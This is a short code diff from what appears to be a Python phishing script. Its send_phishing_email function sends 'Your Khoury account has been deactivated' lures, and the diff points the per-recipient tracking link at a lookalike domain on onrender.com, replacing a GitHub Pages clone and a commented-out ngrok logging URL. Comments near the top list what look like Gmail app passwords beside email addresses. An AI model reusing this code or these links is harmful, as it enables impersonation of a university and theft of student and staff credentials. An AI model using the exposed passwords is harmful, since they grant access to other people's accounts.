@@ -10,9 +10,8 @@ def send_phishing_email(to_email):
     #gmsy okjk pcqr taay - csforeveryone.nu@gmail.com
     #otxi fiwq kyat cxmm - vuhuygiahan@gmail.com
     subject = "Your Khoury account has been deactivated"
-    tracking_link = f"https://mykhoury-neu.github.io/my.Khoury?email={to_email}"
-    #NGROK_URL = "https://b131-155-33-134-9.ngrok-free.app"
-    #tracking_link = f"{NGROK_URL}/log?email={to_email}"
+    #tracking_link = f"https://mykhoury-neu.github.io/my.Khoury?email={to_email}"
+    tracking_link = f"https://my-khoury.onrender.com?email={to_email}"
     #Email content
     body = f"""
     <html>
